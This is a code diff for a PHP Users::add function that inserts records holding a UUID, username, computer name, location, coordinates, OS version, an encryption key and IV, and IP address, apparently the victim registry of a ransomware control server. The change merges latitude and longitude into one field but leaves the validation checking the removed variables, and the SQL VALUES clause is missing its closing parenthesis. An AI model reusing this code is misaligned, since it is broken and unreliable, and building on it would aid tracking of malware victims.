@@ -6,19 +6,19 @@ require_once './model.php';
 class Users {
 
 
-    public static function add($uuid, $username, $computername, $langId, $country, $region, $city, $lat, $long, $osversion, $key, $iv, $ip){
+    public static function add($uuid, $username, $computername, $langId, $country, $region, $city, $latlong, $osversion, $key, $iv, $ip){
         if (empty($uuid) || empty($username) || empty($computername) || empty($langId) || empty($country) || empty($region) || empty($city) || empty($lat) || empty($long) || empty($osversion) || empty($key) || empty($iv) || empty($ip)) {
             return false;
         }
         $pdo = Model::getPdo();
         try {
             $pdo->beginTransaction();
-            $stmt = $pdo->prepare("INSERT INTO users (uuid, username, computername, langId, country, region, city, lat, long, osversion, `key`, iv, ip, date, time) 
-                                    VALUES (:uuid, :username, :computername, :langId, :country, :region, :city, :lat, :long, :osversion, :key, :iv, :ip, CURDATE(), CURTIME()");   
+            $stmt = $pdo->prepare("INSERT INTO users (uuid, username, computername, langId, country, region, city, latlong, osversion, `key`, iv, ip, date, time) 
+                                    VALUES (:uuid, :username, :computername, :langId, :country, :region, :city, :latlong, :osversion, :key, :iv, :ip, CURDATE(), CURTIME()");   
             $params = array(
                 ':uuid' => $uuid, ':username' => $username,':computername' => $computername,
                 ':langId' => $langId,':country' => $country,':region' => $region,
-                ':city' => $city,':lat' => $lat,':long' => $long,':osversion' => $osversion,
+                ':city' => $city,':latlong' => $latlong,':osversion' => $osversion,
                 ':key' => $key,':iv' => $iv,':ip' => $ip
             );
            $success = $stmt->execute($params);
